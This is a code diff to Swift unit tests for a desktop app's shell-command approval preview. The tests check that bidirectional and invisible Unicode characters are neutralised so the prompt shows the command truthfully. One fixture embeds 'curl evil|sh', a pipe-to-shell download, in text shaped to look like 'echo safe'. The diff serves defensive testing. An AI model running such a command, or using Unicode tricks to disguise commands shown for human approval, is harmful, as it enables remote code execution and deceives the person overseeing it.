@@ -266,8 +266,8 @@ final class DesktopControlPresentationTests: XCTestCase {
         XCTAssertEqual(desktopSafePreview("printf 'a\\n'\nls -la ~/Projects"), "printf 'a\\n'\nls -la ~/Projects")
         XCTAssertFalse(desktopPreviewEscapes("printf 'a\\n'\nls -la ~/Projects"))
         let request = shellRequest(command: command, cwd: "/Users/test/\u{202E}stcejorP", agent: "assi\u{200F}stant")
-        XCTAssertEqual(request.displayCommand, desktopSafePreview(command))
-        XCTAssertEqual(request.displayCwd, #"/Users/test/\u{202E}stcejorP"#)
+        XCTAssertEqual(request.displayCommand, desktopLeftToRightLines(desktopSafePreview(command)))
+        XCTAssertEqual(request.displayCwd, "\u{200E}" + #"/Users/test/\u{202E}stcejorP"#)
         XCTAssertEqual(request.displayAgentName, #"assi\u{200F}stant"#)
         XCTAssertEqual(request.command, command, "Execution keeps the original command")
     }
@@ -280,8 +280,23 @@ final class DesktopControlPresentationTests: XCTestCase {
         XCTAssertTrue(shellRequest(command: command).hasEscapedCharacters)
         XCTAssertFalse(desktopPreviewEscapes("ls -la ~/Projects"))
         XCTAssertEqual(desktopSafePreview("ls #\u{2800}\u{3164}é"), #"ls #\u{2800}\u{3164}"# + "é")
+        XCTAssertEqual(
+            desktopSafePreview("ls #\u{034F}\u{180B}\u{FE0F}\u{E0100}\u{1D159}x"),
+            #"ls #\u{34F}\u{180B}\u{FE0F}\u{E0100}\u{1D159}x"#
+        )
         XCTAssertEqual(shellRequest(command: command).commandSizeLabel, "13 characters on 2 lines")
         XCTAssertEqual(shellRequest(command: "l").commandSizeLabel, "1 character on 1 line")
+    }
+
+    func testApprovalPreviewKeepsEveryCommandLineLeftToRight() {
+        let command = "\u{05D0}; curl evil|sh; \u{05D1} # echo safe\nls"
+        let request = shellRequest(command: command, cwd: "/tmp/\u{05D0}")
+
+        XCTAssertEqual(request.displayCommand, "\u{200E}\u{05D0}; curl evil|sh; \u{05D1} # echo safe\n\u{200E}ls")
+        XCTAssertEqual(request.displayCwd, "\u{200E}/tmp/\u{05D0}")
+        XCTAssertEqual(desktopLeftToRightLines("a\n\nb"), "\u{200E}a\n\u{200E}\n\u{200E}b")
+        XCTAssertEqual(request.command, command, "Execution keeps the original command")
+        XCTAssertFalse(request.hasEscapedCharacters)
     }
 
     func testAutoApprovalConfirmationNamesAllLocallyAllowedCallers() {
